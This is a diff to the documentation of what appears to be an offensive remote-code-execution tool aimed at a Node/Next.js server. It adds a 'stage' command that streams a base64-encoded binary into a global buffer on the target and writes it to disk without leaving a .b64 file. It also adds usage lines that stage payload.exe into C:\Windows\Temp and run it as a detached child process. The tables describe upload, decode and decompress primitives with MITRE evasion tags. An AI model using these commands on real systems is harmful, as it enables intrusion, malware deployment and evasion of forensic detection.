@@ -165,6 +165,7 @@ throw Object.assign(new Error('NEXT_REDIRECT'), {digest: `NEXT_REDIRECT;push;/lo
 
 | Command | Signature | Description | Spawns Process? |
 | ------- | --------- | ----------- | --------------- |
+| `stage` | `stage <local.exe> <remote.bin>` | **Preferred** — Reads raw binary locally, base64-encodes in Python memory, streams chunks into `global.__stageBuffer` on target, flushes to `<remote.bin>` via `Buffer.from(...,'base64')`. No `.b64` file on target disk. Replaces `encode_payload.py` + `upload` + `decode` + `rename` (4 steps → 1) | ❌ No — eval only |
 | `upload` | `upload <local.b64> [remote_dest]` | Reads local b64 file, uploads in **2000-char chunks** via `fs.writeFileSync` (chunk 0) / `fs.appendFileSync` (chunks 1+). `remote_dest` defaults to `out.b64` | ❌ No — eval only |
 | `decode` | `decode <in.b64> <out.file>` | Decodes b64 on target: `fs.writeFileSync(out, Buffer.from(fs.readFileSync(in,'utf8').trim(),'base64'))` | ❌ No — eval only |
 | `decompress` | `decompress <in.gz> <out.file>` | **T1027.015** — Decompresses gzip on target: `fs.writeFileSync(out, zlib.gunzipSync(fs.readFileSync(in)))` — **built-in zlib module** | ❌ No — eval only |
@@ -195,7 +196,19 @@ throw Object.assign(new Error('NEXT_REDIRECT'), {digest: `NEXT_REDIRECT;push;/lo
 
 ## File Transfer Workflow
 
-### Upload binary to target (standard)
+### Stage binary to target (preferred — 1 step, no .b64 on target disk)
+
+```bash
+# Reads raw binary locally, encodes in Python memory, streams into global.__stageBuffer,
+# flushes to .bin — eliminates encode_payload.py + upload + decode + rename (4 steps → 1)
+rce > stage payload.exe C:\Windows\Temp\payload.bin
+
+# Execute (use .bin extension — Windows CreateProcessW accepts any extension with full path)
+rce > run C:\Windows\Temp\payload.bin
+rce > eval process.mainModule.require('child_process').spawn('C:/Windows/Temp/payload.bin',[],{detached:true,stdio:'ignore'}).unref()
+```
+
+### Upload binary to target (standard — when .b64 needed on target, e.g. for herpload)
 
 ```powershell
 # 1. Encode locally (PowerShell — no line breaks)
@@ -364,6 +377,7 @@ All methods are `@staticmethod`.
 
 | Method | Signature | Description |
 | ------ | --------- | ----------- |
+| `stage` | `stage(args: str)` | Parses `<local_binary> <remote.bin>`. Reads raw binary, encodes to b64 in Python memory, streams 2000-char chunks into `global.__stageBuffer` on target, writes `Buffer.from(__stageBuffer,'base64')` to dest. Cleanup: `delete global.__stageBuffer` |
 | `upload` | `upload(args: str)` | Parses `<local.b64> [remote_dest]`. Default dest `out.b64`. Reads local file, sends in 2000-char chunks via `writeFileSync`/`appendFileSync` |
 | `decode` | `decode(args: str)` | Parses `<in.b64> <out.file>`. Runs `fs.writeFileSync(out, Buffer.from(fs.readFileSync(in,'utf8').trim(),'base64'))` on target |
 | `decompress` | `decompress(args: str)` | **T1027.015** — Parses `<in.gz> <out.file>`. Runs `fs.writeFileSync(out, zlib.gunzipSync(fs.readFileSync(in)))` on target — built-in `zlib` module, no spawn |
